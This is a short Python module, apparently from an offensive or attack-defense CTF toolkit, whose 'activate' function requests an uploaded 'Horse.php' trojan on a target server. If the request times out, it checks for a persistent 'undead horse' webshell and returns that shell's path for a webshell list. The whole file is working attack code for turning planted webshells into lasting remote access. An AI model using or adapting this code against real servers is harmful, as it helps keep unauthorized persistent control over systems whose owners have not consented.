import requests
from libs.Misc import Config
from libs.Misc import Log


def activate(ip, port, upload_horse_path):
    """激活木马，激活成功返回shell字典，用来添加到webshell列表中"""
    header = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }
    try:
        horse_url = "http://{}:{}/{}/Horse.php".format(ip, port, upload_horse_path)
        requests.get(horse_url, headers=header, timeout=2, proxies=Config.proxy)
        Log.red('Active error.')
    except requests.Timeout:
        undead_horse_url = "http://{}:{}/{}/{}".format(ip, port, upload_horse_path, Config.undead_horse_name)
        try:
            response_ = requests.get(undead_horse_url, headers=header, proxies=Config.proxy, timeout=2)
        except requests.Timeout:
            return Log.red("Active Failed")
        if response_.status_code == 200:
            Log.green("Active Ok")
            upload_shell = {
                "path": upload_horse_path + '/' + Config.undead_horse_name,
                "password": '',
                "method": 'GET',
                "type": 'header'
            }
            return upload_shell
        else:
            Log.red("Active Failed")

